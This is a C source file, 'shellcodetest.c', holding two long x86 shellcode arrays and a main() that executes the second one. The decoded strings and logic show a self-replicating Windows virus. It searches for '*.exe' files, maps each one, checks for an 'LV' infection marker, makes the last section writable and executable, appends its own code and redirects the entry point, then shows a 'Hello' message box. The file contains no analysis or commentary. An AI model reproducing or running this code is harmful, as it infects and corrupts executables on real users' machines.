/*shellcodetest.c*/ 

 char code1[] ="\x31\xc0\x64\xa1\x30\x00\x00\x00\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b"\
"\x40\x08\xeb\x09\x8b\x40\x34\x8d\x40\x7c\x8b\x40\x3c\x50\x89\xc7\x8b\x47\x3c\x8b"\
"\x54\x07\x78\x01\xfa\x8b\x4a\x18\x8b\x5a\x20\x01\xfb\x49\xc1\xe1\x02\x8b\x34\x0b"\
"\x01\xfe\x57\xe9\xb2\x02\x00\x00\x5f\xfc\xc1\xe9\x02\x51\xb9\x0e\x00\x00\x00\xf3"\
"\xa6\x59\x5f\x75\xe0\x83\xe9\x01\x8b\x5a\x24\x01\xfb\xd1\xe1\x66\x8b\x0c\x0b\x8b"\
"\x5a\x1c\x01\xfb\xc1\xe1\x02\x8b\x1c\x0b\x01\xfb\x58\x53\x50\xe8\x6c\x02\x00\x00"\
"\xe8\x90\x02\x00\x00\x5a\x5b\xe8\x14\x02\x00\x00\x8b\x09\x51\x50\x52\x53\x89\xc7"\
"\x89\xde\xe8\x0d\x03\x00\x00\x50\x52\xff\xd6\x89\xc1\xe8\x18\x03\x00\x00\x50\xe8"\
"\xc0\x02\x00\x00\x50\x53\xff\xd1\x50\x58\x59\x51\x50\x89\xcb\x83\xc3\x2c\x8b\x54"\
"\x24\x0c\x8b\x74\x24\x08\xe8\x92\x02\x00\x00\x50\x52\xff\xd6\x6a\x00\x6a\x00\x6a"\
"\x03\x6a\x00\x6a\x01\x68\x00\x00\x00\xc0\x53\xff\xd0\x83\xf8\x00\x0f\x84\x6c\x01"\
"\x00\x00\x50\x8b\x54\x24\x10\xe8\x9e\x02\x00\x00\x50\x52\xff\xd6\x5b\x53\x8b\x4c"\
"\x24\x08\x83\xc1\x20\x8b\x09\x81\xc1\x00\x06\x00\x00\x6a\x00\x51\x6a\x00\x6a\x04"\
"\x6a\x00\x53\xff\xd0\x83\xf8\x00\x0f\x84\x25\x01\x00\x00\x50\x8b\x54\x24\x14\x8b"\
"\x7c\x24\x10\xe8\x51\x02\x00\x00\x50\x52\xff\xd7\x8b\x4c\x24\x0c\x83\xc1\x20\x8b"\
"\x09\x81\xc1\x00\x06\x00\x00\x5b\x53\x51\x6a\x00\x6a\x00\x6a\x02\x53\xff\xd0\x83"\
"\xf8\x00\x0f\x84\xdc\x00\x00\x00\x89\xc6\x56\x66\x81\x3e\x4d\x5a\x0f\x85\xbb\x00"\
"\x00\x00\x66\x81\x7e\x3a\x4c\x56\x75\x06\x0f\x84\xad\x00\x00\x00\x66\xc7\x46\x3a"\
"\x4c\x56\x8b\x5e\x3c\x66\x81\x3c\x1e\x50\x45\x0f\x85\x98\x00\x00\x00\x01\xde\x56"\
"\x8b\x5e\x74\xc1\xe3\x03\x31\xc0\x66\x8b\x46\x06\x48\xb9\x28\x00\x00\x00\xf7\xe1"\
"\x83\xc6\x78\x01\xde\x01\xc6\xc7\x46\x24\x20\x00\x00\xf0\x81\x46\x08\xca\x03\x00"\
"\x00\x8b\x7e\x10\x8b\x46\x08\x5b\x53\xe8\xe6\x00\x00\x00\x8b\x53\x28\x89\x11\x31"\
"\xd2\x8b\x4b\x3c\x89\xcb\xf7\xf1\x29\xd3\x8b\x46\x08\x01\xd8\x89\x46\x10\x29\xf8"\
"\x5b\x53\x01\x43\x50\x8b\x46\x0c\x03\x46\x08\x2d\xca\x03\x00\x00\x50\x8b\x46\x14"\
"\x03\x46\x08\x2d\xca\x03\x00\x00\x5f\x5a\x5b\x01\xd8\x53\x57\xb9\x00\x00\x40\x00"\
"\x8b\x59\x3c\x01\xd9\x8b\x59\x28\x81\xc3\x00\x00\x40\x00\x89\xc7\x89\xde\xb9\xca"\
"\x03\x00\x00\xf3\xa4\x5b\x89\x5a\x28\xe8\xb5\x00\x00\x00\x50\x8b\x4c\x24\x18\x8b"\
"\x54\x24\x1c\x52\xff\xd1\xff\xd0\xe8\x7a\x00\x00\x00\x50\x8b\x4c\x24\x14\x8b\x54"\
"\x24\x18\x52\xff\xd1\xff\xd0\xe8\x67\x00\x00\x00\x50\x8b\x4c\x24\x10\x8b\x54\x24"\
"\x14\x52\xff\xd1\xff\xd0\xe8\x67\x00\x00\x00\x50\x8b\x4c\x24\x0c\x8b\x54\x24\x10"\
"\x52\xff\xd1\x5b\x59\x51\x53\x51\x53\xff\xd0\x83\xf8\x00\x74\x05\xe9\x3c\xfe\xff"\
"\xff\x8b\x74\x24\x10\x8b\x7c\x24\x08\xe8\xa5\x00\x00\x00\x50\x56\xff\xd7\xe8\xaf"\
"\x00\x00\x00\x6a\x00\x53\x53\x6a\x00\xff\xd0\x8b\x44\x24\x14\x05\x00\x00\x40\x00"\
"\xff\xe0\x59\xc3\xe8\xf9\xff\xff\xff\xff\xff\xff\xff\x58\xc3\xe8\xf9\xff\xff\xff"\
"\x43\x6c\x6f\x73\x65\x48\x61\x6e\x64\x6c\x65\x00\x58\xc3\xe8\xf9\xff\xff\xff\x46"\
"\x69\x6e\x64\x4e\x65\x78\x74\x46\x69\x6c\x65\x41\x00\x58\xc3\xe8\xf9\xff\xff\xff"\
"\x55\x6e\x6d\x61\x70\x56\x69\x65\x77\x4f\x66\x46\x69\x6c\x65\x00\x50\xff\xd3\xc3"\
"\xe8\xf7\xff\xff\xff\x4c\x6f\x61\x64\x4c\x69\x62\x72\x61\x72\x79\x41\x00\xe8\x49"\
"\xfd\xff\xff\x47\x65\x74\x50\x72\x6f\x63\x41\x64\x64\x72\x65\x73\x73\x00\xff\xd0"\
"\xc3\xe8\xf8\xff\xff\xff\x55\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x58\xc3\xe8"\
"\xf9\xff\xff\xff\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78\x41\x00\x5b\xc3\xe8\xf9"\
"\xff\xff\xff\x48\x65\x6c\x6c\x6f\x00\x58\xe8\xfa\xff\xff\xff\x45\x78\x69\x74\x50"\
"\x72\x6f\x63\x65\x73\x73\x00\x58\xc3\xe8\xf9\xff\xff\xff\x43\x72\x65\x61\x74\x65"\
"\x46\x69\x6c\x65\x41\x00\x5b\xc3\xe8\xf9\xff\xff\xff\x2a\x2e\x65\x78\x65\x00\x58"\
"\xc3\xe8\xf9\xff\xff\xff\x4d\x61\x70\x56\x69\x65\x77\x4f\x66\x46\x69\x6c\x65\x00"\
"\x58\xc3\xe8\xf9\xff\xff\xff\x43\x72\x65\x61\x74\x65\x46\x69\x6c\x65\x4d\x61\x70"\
"\x70\x69\x6e\x67\x57\x00\x58\xc3\xe8\xf9\xff\xff\xff\x46\x69\x6e\x64\x46\x69\x72"\
"\x73\x74\x46\x69\x6c\x65\x41\x00\x58\xc3\xe8\xf9\xff\xff\xff\x00\x00\x00\x00";

char code[] = "\x31\xc0\x64\xa1\x30\x00\x00\x00\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b"\
"\x40\x08\xeb\x09\x8b\x40\x34\x8d\x40\x7c\x8b\x40\x3c\x50\x89\xc7\x8b\x47\x3c\x8b"\
"\x54\x07\x78\x01\xfa\x8b\x4a\x18\x8b\x5a\x20\x01\xfb\x49\xc1\xe1\x02\x8b\x34\x0b"\
"\x01\xfe\x57\xe9\x33\x03\x00\x00\x5f\xfc\xc1\xe9\x02\x51\xb9\x0e\x00\x00\x00\xf3"\
"\xa6\x59\x5f\x75\xe0\x83\xe9\x01\x8b\x5a\x24\x01\xfb\xd1\xe1\x66\x8b\x0c\x0b\x8b"\
"\x5a\x1c\x01\xfb\xc1\xe1\x02\x8b\x1c\x0b\x01\xfb\x58\x53\x50\xe8\xed\x02\x00\x00"\
"\xe8\x11\x03\x00\x00\x5a\x5b\xe8\x95\x02\x00\x00\x8b\x09\x51\x50\x52\x53\x89\xc7"\
"\x89\xde\xe8\x8e\x03\x00\x00\x50\x52\xff\xd6\x89\xc1\xe8\x99\x03\x00\x00\x50\xe8"\
"\x41\x03\x00\x00\x50\x53\xff\xd1\x50\x58\x59\x51\x50\x89\xcb\x83\xc3\x2c\x8b\x54"\
"\x24\x0c\x8b\x74\x24\x08\xe8\x13\x03\x00\x00\x50\x52\xff\xd6\x6a\x00\x6a\x00\x6a"\
"\x03\x6a\x00\x6a\x01\x68\x00\x00\x00\xc0\x53\xff\xd0\x83\xf8\x00\x0f\x84\xa8\x01"\
"\x00\x00\x50\x8b\x54\x24\x10\xe8\x1f\x03\x00\x00\x50\x52\xff\xd6\x5b\x53\x8b\x4c"\
"\x24\x08\x83\xc1\x20\x8b\x09\x81\xc1\x50\x06\x00\x00\x6a\x00\x51\x6a\x00\x6a\x04"\
"\x6a\x00\x53\xff\xd0\x83\xf8\x00\x0f\x84\x61\x01\x00\x00\x50\x8b\x4c\x24\x0c\x83"\
"\xc1\x20\x8b\x09\x81\xc1\x50\x06\x00\x00\xe8\xbd\x01\x00\x00\x89\x08\x51\x8b\x54"\
"\x24\x18\x8b\x7c\x24\x14\xe8\xbb\x02\x00\x00\x50\x52\xff\xd7\x59\x5b\x53\x51\x6a"\
"\x00\x6a\x00\x6a\x02\x53\xff\xd0\x83\xf8\x00\x0f\x84\xd5\x00\x00\x00\x89\xc6\x56"\
"\x66\x81\x3e\x4d\x5a\x0f\x85\xb4\x00\x00\x00\x66\x81\x7e\x3a\x4c\x56\x0f\x84\x67"\
"\x01\x00\x00\x66\xc7\x46\x3a\x4c\x56\x8b\x5e\x3c\x66\x81\x3c\x1e\x50\x45\x0f\x85"\
"\x93\x00\x00\x00\x01\xde\x56\x8b\x5e\x74\xc1\xe3\x03\x31\xc0\x66\x8b\x46\x06\x48"\
"\xb9\x28\x00\x00\x00\xf7\xe1\x83\xc6\x78\x01\xde\x01\xc6\xc7\x46\x24\x20\x00\x00"\
"\xf0\x81\x46\x08\x4c\x04\x00\x00\x8b\x7e\x0c\x03\x7e\x08\x5b\x53\x89\x7b\x50\xe8"\
"\x5d\x01\x00\x00\x8b\x53\x28\x89\x11\x8b\x46\x08\x31\xd2\x8b\x4b\x3c\x89\xcb\xf7"\
"\xf1\x29\xd3\x8b\x46\x08\x01\xd8\x89\x46\x10\x8b\x46\x0c\x03\x46\x08\x2d\x4c\x04"\
"\x00\x00\x5b\x89\x43\x28\x8b\x46\x14\x03\x46\x08\x2d\x4c\x04\x00\x00\x5b\x01\xd8"\
"\x53\xb9\x00\x00\x40\x00\x8b\x59\x3c\x01\xd9\x8b\x59\x28\x81\xc3\x00\x00\x40\x00"\
"\x89\xc7\x89\xde\xb9\x4c\x04\x00\x00\xf3\xa4\xe8\x34\x01\x00\x00\x50\x8b\x4c\x24"\
"\x18\x8b\x54\x24\x1c\x52\xff\xd1\xff\xd0\xe8\xf9\x00\x00\x00\x50\x8b\x4c\x24\x14"\
"\x8b\x54\x24\x18\x52\xff\xd1\xff\xd0\xe8\xa6\x00\x00\x00\x8b\x00\x50\xe8\xa9\x00"\
"\x00\x00\x50\x8b\x4c\x24\x14\x8b\x54\x24\x18\x52\xff\xd1\x5b\x5a\x52\x6a\x00\x6a"\
"\x00\x53\x52\xff\xd0\xe8\xa3\x00\x00\x00\x50\x8b\x4c\x24\x10\x8b\x54\x24\x14\x52"\
"\xff\xd1\x5a\x52\x52\xff\xd0\xe8\xac\x00\x00\x00\x50\x8b\x4c\x24\x10\x8b\x54\x24"\
"\x14\x52\xff\xd1\xff\xd0\xe8\xac\x00\x00\x00\x50\x8b\x4c\x24\x0c\x8b\x54\x24\x10"\
"\x52\xff\xd1\x5b\x59\x51\x53\x51\x53\xff\xd0\x83\xf8\x00\x74\x05\xe9\x00\xfe\xff"\
"\xff\x8b\x74\x24\x10\x8b\x7c\x24\x08\xe8\xea\x00\x00\x00\x50\x56\xff\xd7\xe8\xf4"\
"\x00\x00\x00\x6a\x00\x53\x53\x6a\x00\xff\xd0\x8b\x44\x24\x14\x05\x00\x00\x40\x00"\
"\xff\xe0\xe8\x0d\x00\x00\x00\x81\x28\x50\x06\x00\x00\xe9\x31\xff\xff\xff\x58\xc3"\
"\xe8\xf9\xff\xff\xff\xff\xff\xff\xff\x58\xc3\xe8\xf9\xff\xff\xff\x53\x65\x74\x46"\
"\x69\x6c\x65\x50\x6f\x69\x6e\x74\x65\x72\x00\x58\xc3\xe8\xf9\xff\xff\xff\x53\x65"\
"\x74\x45\x6e\x64\x4f\x66\x46\x69\x6c\x65\x00\x59\xc3\xe8\xf9\xff\xff\xff\xff\xff"\
"\xff\xff\x58\xc3\xe8\xf9\xff\xff\xff\x43\x6c\x6f\x73\x65\x48\x61\x6e\x64\x6c\x65"\
"\x00\x58\xc3\xe8\xf9\xff\xff\xff\x46\x69\x6e\x64\x4e\x65\x78\x74\x46\x69\x6c\x65"\
"\x41\x00\x58\xc3\xe8\xf9\xff\xff\xff\x55\x6e\x6d\x61\x70\x56\x69\x65\x77\x4f\x66"\
"\x46\x69\x6c\x65\x00\x50\xff\xd3\xc3\xe8\xf7\xff\xff\xff\x4c\x6f\x61\x64\x4c\x69"\
"\x62\x72\x61\x72\x79\x41\x00\xe8\xc8\xfc\xff\xff\x47\x65\x74\x50\x72\x6f\x63\x41"\
"\x64\x64\x72\x65\x73\x73\x00\xff\xd0\xc3\xe8\xf8\xff\xff\xff\x55\x73\x65\x72\x33"\
"\x32\x2e\x64\x6c\x6c\x00\x58\xc3\xe8\xf9\xff\xff\xff\x4d\x65\x73\x73\x61\x67\x65"\
"\x42\x6f\x78\x41\x00\x5b\xc3\xe8\xf9\xff\xff\xff\x48\x65\x6c\x6c\x6f\x00\x58\xe8"\
"\xfa\xff\xff\xff\x45\x78\x69\x74\x50\x72\x6f\x63\x65\x73\x73\x00\x58\xc3\xe8\xf9"\
"\xff\xff\xff\x43\x72\x65\x61\x74\x65\x46\x69\x6c\x65\x41\x00\x5b\xc3\xe8\xf9\xff"\
"\xff\xff\x2a\x2e\x65\x78\x65\x00\x58\xc3\xe8\xf9\xff\xff\xff\x4d\x61\x70\x56\x69"\
"\x65\x77\x4f\x66\x46\x69\x6c\x65\x00\x58\xc3\xe8\xf9\xff\xff\xff\x43\x72\x65\x61"\
"\x74\x65\x46\x69\x6c\x65\x4d\x61\x70\x70\x69\x6e\x67\x57\x00\x58\xc3\xe8\xf9\xff"\
"\xff\xff\x46\x69\x6e\x64\x46\x69\x72\x73\x74\x46\x69\x6c\x65\x41\x00\x58\xc3\xe8"\
"\xf9\xff\xff\xff";
int main(int argc, char **argv)
{
	int (*func)();
	func = (int (*)()) code;
	(int)(*func)();
}

